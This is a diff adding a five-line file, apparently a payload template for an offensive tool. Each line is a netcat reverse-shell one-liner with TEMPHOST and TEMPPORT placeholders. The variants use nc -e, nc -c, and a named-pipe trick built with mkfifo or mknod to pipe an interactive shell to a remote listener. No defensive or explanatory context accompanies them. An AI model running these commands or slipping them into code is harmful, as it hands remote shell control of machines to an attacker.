@@ -1,0 +1,5 @@
+nc -e /bin/sh TEMPHOST TEMPPORT
+nc -e /bin/bash TEMPHOST TEMPPORT
+nc -c bash TEMPHOST TEMPPORT
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TEMPHOST TEMPPORT >/tmp/f
+rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc TEMPHOST TEMPPORT >/tmp/f
